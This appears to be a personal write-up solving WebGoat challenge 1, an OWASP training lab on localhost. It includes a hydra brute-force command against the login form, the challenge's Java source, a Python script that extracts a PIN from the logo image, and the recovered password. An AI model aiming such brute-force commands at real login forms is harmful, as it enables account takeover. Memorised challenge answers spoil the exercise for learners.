
The challenge is simple, you are given the username: admin and must find a password in order to retrieve the flag.

This was a frustrating challenge for me because I spent a while trying to figure out a correct solution only to look online for help and realize for whatever reason my Burp Suite was not collecting correct GET requests from the localhost. This was very frustrating because there was no way for me to accomplish the challenge as intended through information disclosure, so I had to get creative. I knew from online guides the correct directory where you should be able to retrieve the password from looking at the raw source from here:

http://127.0.0.1:8080/WebGoat/challenge/logo

But for my bugged instance of this old version, nothing seemed to work despite 2 hours of trying different approaches, web browsers, proxy settings, different DAST tools etc.

So I then tried to bruteforce knowing the following parameters to format with hydra:

http://127.0.0.1:8080/WebGoat/challenge/1

username    password

Sorry the solution is not correct, please try again.

```shell
hydra -l admin -P wordlist.txt -s 8080 127.0.0.1 http-post-form "/WebGoat/challenge/1:username=^USER^&password=^PASS^:F=Sorry the solution is not correct, please try again." -V -t 4 -f
```

However, this turned out to not work either as the correct password would return from rockyou as 16 possible passwords, all of which did not work, which led me to believe either my knowledge of hydra was insufficient or the password field did not act as intended.

So from here I was stumped so I just decided to check the source code of the challenge in v8.2.1 to see how the password would be formatted and if I could just bypass through the backend.

Here is what I found in the source code:

```java
package org.owasp.webgoat.challenges.challenge1;

  

import org.owasp.webgoat.assignments.AssignmentEndpoint;

import org.owasp.webgoat.assignments.AttackResult;

import org.owasp.webgoat.challenges.Flag;

import org.springframework.util.StringUtils;

import org.springframework.web.bind.annotation.PostMapping;

import org.springframework.web.bind.annotation.RequestParam;

import org.springframework.web.bind.annotation.ResponseBody;

import org.springframework.web.bind.annotation.RestController;

  

import javax.servlet.http.HttpServletRequest;

  

import static org.owasp.webgoat.challenges.SolutionConstants.PASSWORD;

  

/**

 * ************************************************************************************************

 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,

 * please see http://www.owasp.org/

 * <p>

 * Copyright (c) 2002 - 2014 Bruce Mayhew

 * <p>

 * This program is free software; you can redistribute it and/or modify it under the terms of the

 * GNU General Public License as published by the Free Software Foundation; either version 2 of the

 * License, or (at your option) any later version.

 * <p>

 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without

 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU

 * General Public License for more details.

 * <p>

 * You should have received a copy of the GNU General Public License along with this program; if

 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA

 * 02111-1307, USA.

 * <p>

 * Getting Source ==============

 * <p>

 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software

 * projects.

 * <p>

 *

 * @author WebGoat

 * @version $Id: $Id

 * @since August 11, 2016

 */

@RestController

public class Assignment1 extends AssignmentEndpoint {

  

    @PostMapping("/challenge/1")

    @ResponseBody

    public AttackResult completed(@RequestParam String username, @RequestParam String password, HttpServletRequest request) {

        boolean ipAddressKnown =  true;

        boolean passwordCorrect = "admin".equals(username) && PASSWORD.replace("1234", String.format("%04d",ImageServlet.PINCODE)).equals(password);

        if (passwordCorrect && ipAddressKnown) {

            return success(this).feedback("challenge.solved").feedbackArgs(Flag.FLAGS.get(1)).build();

        } else if (passwordCorrect) {

            return failed(this).feedback("ip.address.unknown").build();

        }

        return failed(this).build();

    }

  

    public static boolean containsHeader(HttpServletRequest request) {

        return StringUtils.hasText(request.getHeader("X-Forwarded-For"));

    }

}
```

So the format of the password should be:

!!webgoat_admin_####!!

where #### could be any combination of numbers from 0000 to 9999 depending on the ImageServlet.PINCODE which would generate a random 4 digit integer at runtime.

So knowing that for whatever reason proxy inspection was invalid for me, I decided to simply bruteforce from the 10k possibilities. 

So I saved the WebGoat logo image file locally and then needed to extract the PINCODE using a Python script. The image should have plain text at a specific byte offset (81216–81219) so I asked an AI to help with writing the script.... 

```python
with open('logo.png', 'rb') as f:
    data = f.read()
    offset = 81216
    pin_bytes = data[offset:offset+4]
    pin_str = ''.join(chr(b) for b in pin_bytes if 48 <= b <= 57) 
    if pin_str.isdigit() and len(pin_str) == 4:
        print(f"PINCODE found: {pin_str}")
        print(f"Password: !!webgoat_admin_{pin_str}!!")
    else:
        print("No 4-digit PIN at offset", offset, "- try searching for digits manually")
        # Alternative: search whole file for 4 consecutive digits
        import re
        matches = re.findall(b'\d{4}', data)
        print("Possible 4-digit sequences:", [m.decode() for m in matches])
```

The script had a method for searching at a specific offset and then also trying for 4 consecutive digits. I ran the script and it worked in retrieving the password....

my password:
!!webgoat_admin_1444!!

Enter the password and retrieve the flag.